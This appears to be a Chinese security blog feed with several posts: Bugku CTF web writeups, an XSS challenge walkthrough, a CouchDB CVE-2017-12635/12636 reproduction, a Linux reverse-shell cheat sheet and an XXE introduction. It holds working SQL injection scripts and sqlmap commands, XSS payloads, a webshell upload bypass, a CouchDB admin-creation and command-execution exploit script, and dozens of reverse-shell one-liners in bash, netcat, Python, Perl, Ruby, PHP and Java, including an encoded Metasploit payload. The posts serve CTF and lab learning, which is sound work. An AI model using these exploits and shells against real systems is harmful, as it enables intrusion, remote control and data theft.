bugku-insert_into注入# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : """import requestsimport stringmystring = string.ascii_letters+string.digitsurl = 'http://120.24.86.145:8002/web15/'data = "127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end)) #"def main(): flag = '' for i in range(1, 100): for j in mystring: try: headers = &#123;'x-forwarded-for': data.format(str(i), j)&#125; res = requests.get(url, headers=headers, timeout=4) except requests.exceptions.ReadTimeout: flag += j print(flag) break print(flag)if __name__ == '__main__': main() flag{cdbf14c9551d5be5612f7bb5d2867853} 这是一个神奇的登陆框就双引号注入，都没有过滤什么 database：bugkusql1 table：flag1,whoami 1234567admin_name=-1&quot; union select database(),2 %23admin_name=-1&quot; union select group_concat(table_name) ,2 from information_schema.tables where table_schema = database() %23admin_name=-1&quot; union select group_concat(column_name) ,2 from information_schema.columns where table_name= &apos;flag1&apos; %23admin_name=-1&quot; union select group_concat(flag1) ,2 from flag1 %23 sqlmap 1234sqlmap -r &quot;1.txt&quot; -p admin_name --dbs //爆数据库，注入点为admin_namesqlmap -r &quot;1.txt&quot; -D bugkusql1 -p admin_name --tables //爆表sqlmap -r &quot;1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns //爆字段sqlmap -r &quot;1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump //爆数据 flag{ed6b28e684817d9efcaf802979e57aea } login3https://doubler.cn/2018/04/27/BugKuCTF-Login3/ PHP_encrypt_1123456789101112131415161718192021&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt; 报错注入 http://103.238.227.13:10088/ FLAG格式 Flag:”” ~3C3F706870206664736166617366647361666964736166647361696664736 616B6664736169666473616664736166664736166647361666B6473613B666 6473616664736166736461666473616 66617330686664736739466C61673A2 223732343966356137666431646536 303262333065366633396165613631 393361226673646166736166647361 66647361666473616661203F3E0A Flag:”7249f5a7fd1de602b30e6f39aea6193a” Bugku ctf writeup–web篇–报错注入 https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html MySQL updatexml()、extractvalue() 报错型SQL注入 http://www.cnblogs.com/joy-nick/p/5774462.html sql注入的一些技巧原理 文件包含2 http://118.89.219.210:49166/ flag格式：SKCTF{xxxxxxxxxxxxxxxx} hint:文件包含 writeup来自https://delcoding.github.io/2018/03/bugku-writeup4/ 打开题目，在源代码中发现了upload.php 访问后发现是文件上传，但是只支持图片文件，不够这里没关系，不用考虑怎么绕过，因为文件包含的时候会使用php解析： 上传一句话 但是访问后发现存在过滤，&lt;?php被替换成_。如下图： 但是我们可以使用&lt;script language=php&gt; &lt;/script&gt;标签绕过这个验证，我们再上传一次： 可以看到，后台已经成功的解析了我们的php代码。接着使用菜刀连接。 打开文件即可拿到flag SKCTF{uP104D_1nclud3_426fh8_is_Fun} login2(SKCTF) http://118.89.219.210:49165/SKCTF{xxxxxxxxxxxxxxxxxxxxx}hint:union，命令执行 对请求抓包，然后可以发现tip，解密出来是几行代码。 123$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;&#125; 这里可以看到它是分离式的验证，首先查询username的用户，然后拿出password再进行比较，一开始想着是注入出admin的密码，但发现可能没有这个用户，而且也找不到注入的poc。后来参考网上的writeup才知道正确的打开方式。payload： 1username=&apos; union select md5(1),md5(1)#&amp;password=1 执行这条语句时由于前面的username为空，所以没有数据返回，但后面的union select md5(1),md5(1)则会返回两个MD5(1)的值，然后password我们也置为1，从而绕过if语句的判断。 接下来可以进入命令执行的页面。 然后我们反弹回一个shell来方便我们操作。我们先在本地监听一下，这里使用nc。 1nc -lvv 8888 然后执行反弹shell的命令。 1|bash -i &gt;&amp; /dev/tcp/你的公网ip/8888 0&gt;&amp;1 最后就能在服务器上收到shell，然后查询flag。 SKCTF{Uni0n_@nd_c0mM4nD_exEc} bugku login2 writeup 不使用vps的方法 bugku平台 login2 writeup Linux渗透之反弹Shell命令解析 linux下反弹shell的姿势 vps登录ssh Trim的日记本 http://120.24.86.145:9002/ hints：不要一次就放弃 注册一个用户，但是不知道id 后来用扫描器扫一扫 发现show.php show.php即可发现flag flag1:{0/m9o9PDtcSyu7Tt} flag.php 地址：http://120.24.86.145:8002/flagphp/ 点了login咋没反应 提示：hint 1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; flag{unserialize_by_virink} 多次这里学到一种新的注入方式异或注入 id后面输入 1’^(0)^’，此时页面正常返回，如果换一下 ‘^(1)^’，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。 比如 1’^(length(‘select’)=6)^’ 测试这个select应该是被过滤的了，实现的语句应该是id=1&#39;^0^0,有过滤返回正确，而无过滤的时候就会返回错误 测试得到以下关键字被过滤 1union,select,and,or 尝试一下是否可以双写绕过 可以绕过，然后就是常规操作了 1234567id=-1&apos; uunionnion selecselectt 1,2 %23?id=-1&apos; uunionnion selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema = database()%23?id=-1&apos; uunionnion selecselectt 1,group_concat(column_name) from infoorrmation_schema.columns where table_schema = database()%23?id=-1&apos; uunionnion selecselectt 1,group_concat(flag1,&apos;-----&apos;,address) from flag1%23 payload http://120.24.86.145:9004/1ndex.php?id=1&#39; anandd 1=2 uniounionn selecselectt 1,flag1 from flag1%23 假的flag usOwycTju+FTUUzXosjr 第二关 1?id=1&apos; union select limit from and or where if sleep substr ascii 输出 1My Id =1&apos; select limit from and or where if ascii 过滤了union ，sleep，substr 有回显，而且过滤了union，双写不能绕过，可以试一下报错注入 1234?id=1&apos; and updatexml(1,concat(0x0a,(select database()),0x0a),1)%23?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=flag2),0x7e),1)%23?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23 1234567?id=1&apos; and extractvalue(1,concat(0x0a,(select database()),0x0a))%23?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x0a))%23?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag2&apos;),0x0a))%23?id=1&apos; and extractvalue(1,concat(0x0a,(select group_concat(flag2,address) from flag2),0x0a))%23 flag flag{bugku-sql_6s-2i-4t-bug} 总结一是通过异或注入判断过滤的关键字，二是在union被过滤的情况之下要想到报错注入的方式 参考 https://blog.csdn.net/u011377996/article/details/79340100#t17]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSTV挑战赛]]></title>
    <url>%2F2018%2F07%2F10%2FXSSTV%E6%8C%91%E6%88%98%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[靶场​ http://test.xss.tv ​ 也可以自己搭在本地搭建 ​ 链接: https://pan.baidu.com/s/1xEZl3OiBw1l_goWzrbf4tw 密码: akvp 工具：​ firefox 61版本 ​ chrome 67版本 ​ burpsuite 0x011?name=&lt;script&gt;alert(1)&lt;/script&gt; 0x02先测试一下 1?keyword=&lt;script&gt;alter(1)&lt;/script&gt; 没反应，查看下源代码 有两个输出点，h2标签转义了 &lt; ，&gt; 但是下面的input没有过滤 &gt;闭合了input标签，然后加了一个能触发alert的属性就行了。 payload onchange=alert(1)&gt; 弹出成功后查看一下源代码，觉得有点不对劲 加上双引号闭合，但是没有弹出,发现后面有个 &quot;&gt;，用br闭合一下 “onchange=alert(1)&gt; “onchange=alert(1)&gt; &lt;br “= 0x03 两个输出点都转义了&gt; &lt;， 跟第二关一样试试加属性 1&apos;onchange=alert(1) 发现不知道为啥多了个单引号，闭合一下 done payload 1&apos;onchange=alert(1) &apos;=&quot; 0x04payload 1&quot;onchange=alert(1) &apos;=&apos; 0x05都被安排上了，插入了一个_ 试试expression 1&quot;&gt;&lt;img style=&quot;xss:expression(alert)&quot;&gt; 再试试href 后面多了个 &quot;&gt; ，继续加个标签闭合一下 payload 1&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;&lt;br &quot;= 0x06此处的防御大概如下 href 转换为 hr_ef on 替换为 o_n 然而只要切换大小写就可以绕过转换。 payload 1&quot;&gt; &lt;a Href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt; 0x07script被删掉，试一下双写 payload 1&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt; 0x08javascript 加了个 _ ，使用HTML实体字符绕过 HTML16编码 HTML10编码 输入之后点一下友情链接 payload 12javasc&amp;#x0072;ipt:alert(1)javasc&amp;#x0072;ipt:alert`1` 0x09刚开始以为只有input一个输出点（其实input根本不是输出点），href才是真的输出点，后来发现是要加上 http，要不然检测为不合法链接不给过 payload 1javasc&amp;#x72;ipt:alert(1)//http://blog 0xA查看源代码发现有hidden，肯定有问题，一个一个试着能不能注入，发现t_sort可以传入参数 payload 12?t_link=&amp;t_history=&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=alert`1` &quot;?t_link=&amp;t_history=&amp;t_sort=&quot; onclick=alert(0) type=&quot;submit&quot; 0xB把input标签的hidden改为text，在出现的文本框随便输入，回车发现 t_ref 被传入值，查看网络发现 这个值就是请求头的referer firefox直接改不能在页面看出效果，burpsuite改一改 0xC传user-agent的值 burpsuite改一改 0xD 抓个包 ，发现是Cookie的user，改一改 0xE需要登录 0xF注意： 需要科学上网，因为angular.min.js 是用google的api引入 涉及到AngularJS 简单来说，AngularJS 通过新的属性和表达式扩展了 HTML 源码中的ng-include即包含外部的 HTML 文件，文件名来自src参数，包含的内容将作为指定元素的子节点。 由于ng-include遵循SOP，所以我们可以选择包level 1： payload 1src=&apos;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&apos; 0x10直接把keyword的值输出到center标签，构造一个标签 script被过滤，用on事件代替 空格被转义，用%0a代替空格 点图片上面一点的灰色 payload 123&lt;button%0Aonclick=alert()&gt;?keyword=%3Cimg%0asrc=xss%0aonerror=%27alert(1)%27%3E?keyword=&lt;img%0Asrc=&quot;xss&quot;%0Aonerror=alert()&gt; 0x11传点参数进去，会显示在embed标签里 在firefox上启动不了flash，就在chrome试了 payload 1?arg01=a&amp;arg02= onmouseover=alert(1) 0x12 payload 1?arg01=a&amp;arg02= onmouseover=alert(1) 总结反射型XSS用途已经不那么大了，如果payload在url中很容易被chrome xss auditor拦截 所以才用firefox 参考链接http://blkstone.github.io/2017/06/08/xss-challenge/ https://www.cnblogs.com/r00tuser/p/7407459.html https://zhuanlan.zhihu.com/p/29866236 https://www.tr0y.wang/2018/04/10/XSSLoad/ http://www.fooying.com/the-art-of-xss-1-introduction/ http://shaobaobaoer.cn/archives/603/xss-%E6%8C%91%E6%88%98%E8%B5%9B-wp-%E4%B8%8A（调皮的shaobaobaoer） https://brutelogic.com.br/blog/（very good） https://wps2015.org/drops/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CouchDB的两个CVE复现]]></title>
    <url>%2F2018%2F07%2F09%2FCouchDB%E7%9A%84%E4%B8%A4%E4%B8%AACVE%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[复现地址： http://vulhub.org/#/environments/couchdb/CVE-2017-12635/ http://vulhub.org/#/environments/couchdb/CVE-2017-12636/ i春秋有实验，不用自己搭，但是慢。I春秋的实验指导还是可以看一下的 https://www.ichunqiu.com/course/60383 背景 Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。 漏洞概述 CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 影响版本：小于 1.7.0 以及 小于 2.1.1 Couchdb 垂直权限绕过漏洞（CVE-2017-12635） 1curl -X PUT -d &apos;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;vulhub&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;123456&quot;&#125;&apos; 192.168.190.128:5984/_users/org.couchdb.user:vulhub -H &quot;Content-Type:application/json&quot; Couchdb 任意命令执行漏洞（CVE-2017-12636） CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB在query_server中引入了外部的二进制程序来执行命令，我们可以通过CouchDB自身提供的Restful API接口动态修改保存配置，从而执行系统命令 Couchdb 1.6.0环境：1234curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest&apos;curl -X PUT &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;curl -X POST &apos;http://vulhub:vulhub@192.168.190.128:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos; 其中,vulhub:vulhub为管理员账号密码。 第一个请求是添加一个名字为cmd的query_servers，其值为&quot;id &gt;/tmp/success&quot;，这就是我们后面待执行的命令。 第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。 第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。 Couchdb 2.1.0环境：启动docker 12345curl http://vulhub:vulhub@your-ip:5984/_membershipcurl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &apos;&quot;id &gt;/tmp/success&quot;&apos;curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest&apos;curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &apos;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&apos; -H &quot;Content-Type: application/json&quot; 反弹shell注意：反弹Shell的命令，在经过数据库处理时被截断，不能直接执行，遂此处分为两步去实现（还有其他方法，仁者见仁） 。 终于知道为啥我直接反弹shell不成功了，瞎搞半天。 在/home/目录下 新建index.html，内容为 1bash -i &gt;&amp; /dev/tcp/192.168.190.128/9000 0&gt;&amp;1 终端运行，端口被占用了就换个端口 1python -m SimpleHTTPServer 8013 curl 或者 p牛的代码执行下面两条command， 12curl 192.168.190.128:8013/ -o /tmp/bashshellbash /tmp/bashshell 反弹shell成功 p牛代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/7/8# @Author : Lhaihai# @File : Couchdb-Exp# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : """import requestsfrom requests.auth import HTTPBasicAuthtarget = 'http://192.168.190.128:5984'# command = '"bash -i &gt;&amp; /dev/tcp/192.168.190.128/12000 0&gt;&amp;1"'# command = '"curl 192.168.190.128:8013/ -o /tmp/bashshell"'# command = '"bash /tmp/bashshell"'version = 2session = requests.session()session.headers = &#123; 'Content-Type': 'application/json'&#125;# session.proxies = &#123;# 'http': 'http://127.0.0.1:8085'# &#125;session.put(target + '/_users/org.couchdb.user:wooyun', data='''&#123; "type": "user", "name": "wooyun", "roles": ["_admin"], "roles": [], "password": "wooyun"&#125;''')session.auth = HTTPBasicAuth('wooyun', 'wooyun')if version == 1: session.put(target + ('/_config/query_servers/cmd'), data=command)else: host = session.get(target + '/_membership').json()['all_nodes'][0] session.put(target + '/_node/&#123;&#125;/_config/query_servers/cmd'.format(host), data=command)session.put(target + '/wooyun')session.put(target + '/wooyun/test', data='&#123;"_id": "wooyuntest"&#125;')if version == 1: session.post(target + '/wooyun/_temp_view?limit=10', data='&#123;"language":"cmd","map":""&#125;')else: session.put(target + '/wooyun/_design/test', data='&#123;"_id":"_design/test","views":&#123;"wooyun":&#123;"map":""&#125; &#125;,"language":"cmd"&#125;') 漏洞修复建议： 1、指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在/etc/couchdb/local.ini文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。 2、设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码。]]></content>
      <categories>
        <category>Web安全</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux反弹shell解析和总结]]></title>
    <url>%2F2018%2F07%2F08%2FLinux%E5%8F%8D%E5%BC%B9shell%E8%A7%A3%E6%9E%90%E5%92%8C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[原理http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/ https://www.anquanke.com/post/id/85712 反弹shell的各种姿势自带工具Bash针对不同的linux版本，可能有不同的利用方式，这里简单列一下，在使用的时候自行测试。 0x011bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 0x021exec /bin/bash 0&amp;0 2&gt;&amp;0 0x0310&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 0x041exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done netcatnetcat使我们常用nc，不同的版本有不同的利用方式，所以需要依次测试才能得到真正可用的。 0x01支持 - e 选项 1nc -e /bin/sh 10.0.0.1 1234 0x02安装的 NC 版本有问题时： 1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f 不能使用 - e 选项时： 0x031nc -c /bin/sh attackerip 4444 0x041/bin/sh | nc attackerip 4444 0x051rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p 0x061mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe Telnet(nc 不可用或 / dev/tcp 不可用时) telnet客户端作为一个远程管理设备的软件，也可以作为反弹shell的软件 0x011rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p 0x021telnet attackerip 4444 | /bin/bash | telnet attackerip 4445 远程服务器监听tcp的4445端口 0x031mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe 常见脚本pythonpython作为一个优秀的脚本语言通常默认安装在各大linux操作系统中，可以做很多事情。 0x011python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 0x021python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")" 另外 Metasploit 版的代码： 123msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.90.1 LPORT=1234import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg==')) Perl0x011perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' 0x02不依赖于 / bin/sh 的 shell： 这条语句比上面的更为简短，而且确实不需要依赖 / bin/sh 1perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' 0x031perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' Ruby0x011ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' 0x02不依赖于 / bin/sh 的 shell： 1ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' 0x03如果目标系统运行 Windows： 1ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' PHP1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' java123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() 其他工具linux下还有一些不常见的工具也可以实现这些功能。 gawkGNU AWK (GAWK) 是历史悠久的 AWK 编程语言的开放源代码实现，可用于所有的 UNIX® 系统。AWK 语言是一种 UNIX 备用工具，它是一种功能强大的文本操作和模式匹配语言，特别适用于进行信息检索，这使得它非常适合用于当今的数据库驱动的应用程序。因为它集成于 UNIX 环境，所以可以设计、构建和快速地执行完整的工作程序，并且立即就能得到结果。 xtermxterm是一个X Window System上的标准虚拟终端。用户可以在同一个显示器上开启许多xterm，每一个都为其中运行的进程提供独立的输入输出（一般来说此进程是Unix shell）。 1xterm -display 10.0.0.1:1 以上命令在目标服务器上执行会反连shell到10.0.0.1的6001端口。 在10.0.0.1上如何监听获取shell，需要执行一下命令： 1Xnest :1 使用以下命令授权远程主机连接到本机： 1xhost +targetip 总结（找不到从哪里copy来了，=.=） 反弹的核心是和目标系统建立连接(如果中间被防火墙阻断了,那你就要想办法了,尤其当你一个较低的权限在操作时,这里只是单纯的把shell弹回来,至于其他的各种问题,后续再说), 不管你用系统的管道也好,用各种语言提供的socket函数也好,反正最后的目的只有一个,我们只是需要一个目标系统的shell……基于现有这些思路,其实,还可以衍生出来非常多的shell反弹方式,大家只要敢开脑洞就好了,理解反弹shell的本质比直接抄来就用会好很多, 其实,有时候真的并不需要自己多么多高的智商,你只需要站在前人的肩膀上,基于现有的资源条件下不断衍生出自己的想法并加以实践这就足以变的强大起来,虽然,会慢人一步,但那只是暂时的,厚积薄发,融会贯通嘛,贵在坚持 参考链接：https://klionsec.github.io/2016/09/27/revese-shell/ http://www.myh0st.cn/index.php/archives/237/ http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html https://www.leavesongs.com/PYTHON/python-shell-backdoor.html http://www.91ri.org/6620.html]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞理解与测试]]></title>
    <url>%2F2018%2F07%2F08%2FXXE%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3%E4%B8%8E%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[为何一直复现不成功远程和blind XXE在vulhub的php_xxe环境下复现不成功，windows的php5.6（libxml Version 2.9.4 ）不能复现成功（wamp），windwos的php5.2（libxml Version 2.7.7）复现成功(phpstudy) (捣鼓了两天心好痛) （copy 来自 https://lightless.me/archives/Research-On-XXE.html） 之前我一直在自己的 ubuntu14.04+lnmp 的环境下测试的时候，一直不能复现这个问题，只在 kali 的某个版本上复现成功了，一直不知道原因。直到最近发现了这两个东西：http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexmlhttp://php.net/manual/en/libxml.constants.php 主要是simplexml_load_file这个函数的问题，在旧版本中是默认解析实体的，但是在新版本中，已经不再默认解析实体了，需要在 simplexml_load_file 函数中指定第三个参数为LIBXML_NOENT，不然不会解析实体的。 大部分关于 XXE 的内容都可以参考这篇文章：http://security.tencent.com/index.php/blog/msg/69 （copy 来自 http://www.freebuf.com/column/156863.html） libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。 坑点：在远程XXE，evilxxe.dtd路径写file://D:/1.txt出错 evilxxe.dtd路径写file:///D:/1.txt 成功 在BlindXXE的php里 出错，路径D:前加了/ 1&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/D:/1.txt&quot;&gt; 去掉/成功 1&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt; 基础知识XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。 原理：XXE (XML External Entity Injection) 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。 DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 参考链接：http://www.w3school.com.cn/dtd/ 首先了解下基本的PAYLOAD结构，然后再介绍每部分涉及的知识点，如下PAYLOAD开头进行了XML的声明，然后使用DTD声明实体(这里使用了file协议)，最后使用XML获取实体的数据。 XML基础（copy 来自 https://thief.one/2017/06/20/1/） XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。 XML文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 12345678910111213141516171819&lt;!--XML申明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; 